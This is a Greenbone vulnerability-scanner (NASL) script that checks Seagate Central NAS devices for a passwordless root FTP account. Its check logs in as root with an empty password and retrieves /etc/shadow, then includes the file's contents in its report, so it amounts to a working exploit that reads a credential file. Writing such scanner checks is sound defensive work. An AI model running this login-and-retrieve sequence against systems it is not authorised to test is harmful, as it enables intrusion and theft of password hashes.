if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105288" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Seagate Central Remote Root Security Bypass Vulnerability" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132163" );
	script_tag( name: "vuldetect", value: "Login into the remote FTP as root without password." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "Seagate Central by default has a passwordless root account (and no option to change it)." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-06-05 14:40:09 +0200 (Fri, 05 Jun 2015)" );
	script_category( ACT_GATHER_INFO );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/seagate/central/detected" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "Welcome to Seagate Central" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
if(!ftp_authenticate( socket: soc, user: "root", pass: "" )){
	close( soc );
	exit( 0 );
}
port2 = ftp_pasv( socket: soc );
if(!port2){
	close( soc );
	exit( 0 );
}
soc2 = open_sock_tcp( port2 );
if(!soc2){
	close( soc );
	exit( 0 );
}
send( socket: soc, data: "RETR /etc/shadow\r\n" );
recv1 = recv( socket: soc, length: 512 );
recv2 = recv( socket: soc2, length: 512 );
close( soc );
close( soc2 );
if(ContainsString( recv1, "226 Transfer complete" ) && ContainsString( recv2, "sshd:" )){
	report = "It was possible to login as root without a password and to retrieve /etc/shadow. Here is the content:\n\n==========>>\n\n" + recv2 + "\n\n<<==========\n";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

